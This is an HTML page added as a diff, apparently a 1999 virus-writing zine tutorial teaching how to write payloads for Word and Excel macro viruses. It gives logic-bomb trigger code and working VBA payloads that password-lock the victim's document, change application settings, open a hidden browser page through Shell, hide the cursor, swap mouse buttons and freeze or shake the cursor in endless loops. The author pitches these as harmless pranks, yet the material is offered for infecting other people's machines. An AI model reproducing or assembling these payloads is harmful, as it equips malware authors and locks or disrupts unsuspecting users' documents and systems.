@@ -1,0 +1,328 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Payloads in macro</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Payloads ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</b>
+
+     .What is a payload?
+     .Triggers
+     .Basic payloads
+     .Phunny payloads	
+   
+   [ Music ]
+
+     .Incubus .S.C.i.E.N.C.E.
+     .Ryker's .Brother against brother
+     .Keith Caputo .Died Laughing
+
+<b>
+.What is a payload?</b>
+
+   The payload is one of the reasons viruses are made, to deliver a certain
+effect or  message to the " world outside ", a kind of electronic graffiti.
+This same payload is the one thing that will get the virus noticed,  hunted
+and killed  though.  Payloads are generally  triggered by  logic bombs  and
+often produce graphical,  musical or destructive effects.  A lot of viruses
+with destructive  side effects are  not even intentionally  destructive but
+are the result of poor programming skills. The most successful virus from a
+infecting point of view is the virus without a payload, it will not attract
+attention to itself through any side effect.              [Taken from VDAT]
+
+<b>
+.Triggers</b>
+
+   What the hell are triggers?  Well,  the trigger activates  your payload.
+This trigger can be nearly everything, a date, a time, a day, a random num-
+ber,  etc.  I will show you here a few common  trigger methods that you can
+use in your creation. First of all the basic one, checking the date.
+
+ If Day(Now()) = 31 Then
+  '&lt;- Your payload here ;)
+ End If
+
+   As you may see,  this one checks if the day  is the 31st of a  month and
+activates the payload. You can combine it with for  example with a specific
+month or time.
+
+ If Day(Now()) = 31 And Month(Now()) &lt; 5 Then
+  '&lt;- Your payload here ;)
+ End If
+
+   This one would  activate our payload  only on every 31st of  the current
+month after may. Here an example to combine it with time.
+
+ If Day(Now()) = 31 And Hour(Now()) &lt; 10 Then
+  '&lt;- Your payload here ;)
+ End If
+
+   This one would  activate it on every 31st after  ten o'clock.  Ok, now a
+list of some commands you can use for your trigger.
+
+ Day(Now()) - Checks for the current day
+ Month(Now()) - Checks for the current month
+ Year(Now()) - Checks for the current year
+ Hour(Now()) - Checks for the current hour
+ Minute(Now()) - Checks for the current minute
+ Second(Now()) - Checks for the current second
+ WeekDay(Now()) - Checks for the current weekday
+
+ ...etc. A good idea is it to combine those different triggers. Another one
+I will explain  you is a random trigger.  You can use a random trigger in a
+lot of different methods. For example use it with a random number.
+
+ If Int(Rnd * 5) = 3 Then
+  '&lt;- Your payload here ;)
+ End If
+
+   As you see, if a number between 0  and 5 is 3 then activate our payload.
+Or you do something like this to activate it on a random day.
+
+ If Day(Now()) = Int(Rnd * 31) + 1 Then
+  '&lt;- Your payload here ;)
+ End If
+
+   This payload will  activate only if a random  number is equal to the cur
+rent day. You can combine this together with day, month whatever...
+
+   Well, as you see,  there are a lot of  things you can trigger,  just let
+your imagination free space.  A few ideas on your way now,  Version-Number,
+Username, Caps Lock, etc etc.
+
+<b>
+.Basic Payloads</b>
+
+ .Show message
+
+    To show the user a message, it doesn't need much. I wonder why I putted
+this here...
+
+ MsgBox "I am your message!"
+
+
+ .Insert password
+
+    To insert a password for the active document or workbook or whatever.
+
+ ActiveDocument.Password = "Blah!"
+
+
+ .Change the caption of the app
+
+    To change the nice caption of your fav application.
+
+ Application.Caption = "Older than the trees!"
+
+
+ .Change Username
+
+    To change the username ie if the Username in Word is 'Paul'  we can try
+to change it using this.
+
+ Application.Username = "jackie"
+
+
+.Run hyperlink
+
+    To run ie a good page.
+
+ Shell "start http://www.coderz.net/jackie/", vbHide
+
+
+    As you see, some nice examples for basic payloads. Now we gonna take a
+look on advanced payloads, better ones.
+
+<b>
+.Phunny payloads</b>
+
+    I wrote that payloads once in a tutorial because I was sick of all that
+lame macro viruses using lame payloads.  That ones will make stuff with our
+cursor. And, you need a basic understanding of using API's in VBA.
+
+
+ .Hide the cursor 
+
+    This is an  easy and short  piece of code.  I used it in  my very first
+macro virus.  To use this also in your macro you  need to add the following
+line in the head part of the virus to declare the needed API call:
+
+ Private Declare Function ShowCursor Lib "USER32" _
+  (ByVal fShow As Integer) As Integer
+
+    This is the api  call for this function. So to show or  hide the cursor
+you could use this piece of code:
+
+    To hide the cursor use:
+
+ While ShowCursor(False) &gt;= 0
+ Wend
+
+    To show it again use:
+
+ While ShowCursor(True) &lt; 0
+ Wend
+
+    This payload  can be a lot of fun!  What would  you say if  your cursor
+gets invisible?  Attention, the cursor is only  invisible for Word or Excel
+or whatever  application you may use it,  in Windows the cursor is visible!
+
+
+ .Swap the mousebuttons 
+
+    This one is big fun, really. If the user wants to click a menu suddenly
+the popupmenu appears! :) You exchange the right button with the left. Also
+for this payload you need an API call. Insert following into your code:
+
+ Private Declare Function SwapMouseButton Lib "user32" _
+  (ByVal bSwap As Long) As Long
+
+To swap the buttons and also swap them back you need the following code
+
+    Swap:
+
+ SwapMouseButton &H2
+
+    Undo this:
+
+ SwapMouseButton H2
+
+    Easy isn't it?  Such less code and so annoing to the user! ;) The next
+we will talk about is my favourite vba payload ever. Take a look...
+
+
+ .Make the cursor go round and round 
+
+    For this payload is a little bit more  code needed then for the others,
+but you get  the complete code  here and  actually it is the  best of those
+payloads here. If you want to see this payload in action,  look at my cross
+infector. It has this payload ... First you need three API calls.
+
+ Private Declare Function SetCursorPos Lib "USER32" _
+  (ByVal x As Long, ByVal y As Long) As Long
+
+ Private Declare Function GetCursorPos Lib "USER32" _
+  (lpPoint As Punkt) As Long
+
+ Private Declare Sub Sleep Lib "kernel32" _
+  (ByVal dwMilliseconds As Long)
+
+    Then we have to declare a new Type.  I call it 'Punkt' here but you can
+use any other name too.
+
+ Private Type Punkt
+  xAchse As Long
+  yAchse As Long
+ End Type
+
+    After that we  take a look at the procedure which starts  this payload.
+It's very important to declare the variables as Long. If you don't the pay-
+load won't work correct.
+
+ Dim newx As Long
+ Dim newy As Long
+ Dim posPunkt As Punkt
+
+    This here is important...declare as long
+    
+ Do
+ GetCursorPos posPunkt
+
+    Get the current position and save it in posPunkt
+
+ newx = Rnd(2)
+ If newx = 0 Then newx = -5 Else newx = 5
+
+    Make new random cursor position x...
+
+ newy = Rnd(2)
+ If newy = 0 Then newy = -5 Else newy = 5
+
+    Make new random cursor position y...
+
+ SetCursorPos posPunkt.xAchse + newx, posPunkt.yAchse + newy
+
+    Set the new position...
+
+ Sleep 2
+
+    Wait for two milliseconds...
+
+ DoEvents
+ Loop
+
+    Next move of the cursor...
+
+    This here is more code but with an amazing effect. The cursor will move
+like an earthquake hits the screen. The cursor ' trembles ',  you will see.
+The next one  is also a really  good payload.  I got  the idea  right while
+writing this tutorial for our zine. So this one is really brand new...
+
+
+ .Nail the cursor 
+
+    The cursor won't move.  It remains on the same position. ;) We need the
+same API calls as for the last one. Here they are:
+
+ Private Declare Function SetCursorPos Lib "USER32" _
+  (ByVal x As Long, ByVal y As Long) As Long
+
+ Private Declare Function GetCursorPos Lib "USER32" _
+  (lpPoint As Punkt) As Long
+
+    Then we have to declare a new Type. It is called 'Punkt' here, remember
+you can call it whatever you like...
+
+ Private Type Punkt
+  xAchse As Long
+  yAchse As Long
+ End Type
+
+    Sorry we don't  need the sleep command  again coz our cursor  is nailed
+and remains nailed!  So now look at the procedure which starts the paylaod.
+
+
+ Dim posPunkt As Punkt
+    
+ GetCursorPos posPunkt
+
+    Save again the position...
+
+ Do
+
+    Make a loop again...
+
+ SetCursorPos posPunkt.xAchse, posPunkt.yAchse
+
+    Set the position.  Everytime at the same position so  the cursor stands
+still.
+
+ Loop
+
+    Play it again Sam! Wow...the cursor won't move anymore!
+
+
+    I hope this here will  inspire you that you  won't write payloads  that
+screw up others data and so.  This is what makes macro a bad name and we if
+you want to make it a 'good' name use stuff like  this or find your own non
+destructive payloads. I think it's a great effect if you nail a cursor than
+deleting some files (this can be done by a batch file!).  So in this sense,
+happy payload writing!
+
+                               -End Of Part#11-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
